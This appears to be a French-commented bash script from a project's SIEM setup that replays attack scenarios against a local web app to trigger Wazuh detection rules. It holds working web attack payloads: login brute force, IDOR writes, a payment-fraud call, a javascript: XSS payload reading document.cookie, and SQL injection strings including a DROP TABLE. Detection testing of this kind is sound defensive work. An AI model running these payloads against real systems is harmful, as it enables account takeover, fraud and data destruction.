#!/usr/bin/env bash
# Rejoue les scénarios d'attaque contre l'app locale pour déclencher les alertes Wazuh.
# Usage : siem/attack.sh bruteforce|idor|fraud|xss|scan|sqli
# Variables : BASE_URL (défaut http://localhost:3000), COOKIE (cookie de session de l'attaquant,
# copié depuis le navigateur), PRODUCT_ID (produit d'un autre utilisateur),
# PAYMENT_ID (paiement dont l'attaquant est le vendeur), CONVERSATION_ID.
set -euo pipefail
BASE_URL="${BASE_URL:-http://localhost:3000}"
need() { [ -n "${!1:-}" ] || { echo "Variable $1 requise pour ce scénario" >&2; exit 1; }; }
req() { curl -s -o /dev/null -w "%{http_code}\n" "$@"; }

case "${1:-}" in
  bruteforce) # -> 100101 x6, 100102 (T1110.001)
    for i in $(seq 1 6); do
      req -X POST "$BASE_URL/api/auth/sign-in/email" -H "Content-Type: application/json" \
        -d "{\"email\":\"victime@example.com\",\"password\":\"essai$i\"}"
    done ;;
  idor) # -> 100110 x5, 100111
    need COOKIE; need PRODUCT_ID
    for i in $(seq 1 5); do
      req -X PUT "$BASE_URL/api/products/$PRODUCT_ID" -H "Cookie: $COOKIE" \
        -H "Content-Type: application/json" -d '{"title":"pwned"}'
    done ;;
  fraud) # -> 100120 (vendeur qui valide lui-même la réception)
    need COOKIE; need PAYMENT_ID
    req -X POST "$BASE_URL/api/payments/$PAYMENT_ID/buyer-validation" -H "Cookie: $COOKIE" \
      -H "Content-Type: application/json" -d '{}' ;;
  xss) # -> 100130
    need COOKIE; need CONVERSATION_ID
    req -X POST "$BASE_URL/api/messages/send" -H "Cookie: $COOKIE" -H "Content-Type: application/json" \
      -d "{\"conversationId\":\"$CONVERSATION_ID\",\"messageType\":\"image\",\"content\":\"javascript:alert(document.cookie)\"}" ;;
  scan) # -> 100112 x12, 100131 (T1595) ; pour un vrai scan : zap.yaml
    for id in a b c d e f; do
      for m in PUT DELETE; do req -X "$m" "$BASE_URL/api/products/$id"; done
    done ;;
  sqli) # -> 100140 x12, 100141 (T1190)
    for p in "' OR 1=1--" "x' OR '1'='1" "1 UNION SELECT NULL,NULL--" "1; DROP TABLE product--" "1 AND SLEEP(5)"; do
      req -G "$BASE_URL/api/products/search" --data-urlencode "q=$p"
      req -G "$BASE_URL/api/products" --data-urlencode "search=$p"
    done
    req -X POST "$BASE_URL/api/auth/sign-in/email" -H "Content-Type: application/json" \
      -d '{"email":"admin@example.com'"'"' OR 1=1--","password":"x"}'
    req -X POST "$BASE_URL/api/auth/sign-in/username" -H "Content-Type: application/json" \
      -d '{"username":"admin'"'"' OR 1=1--","password":"x"}' ;;
  *) echo "Usage : $0 bruteforce|idor|fraud|xss|scan|sqli" >&2; exit 1 ;;
esac
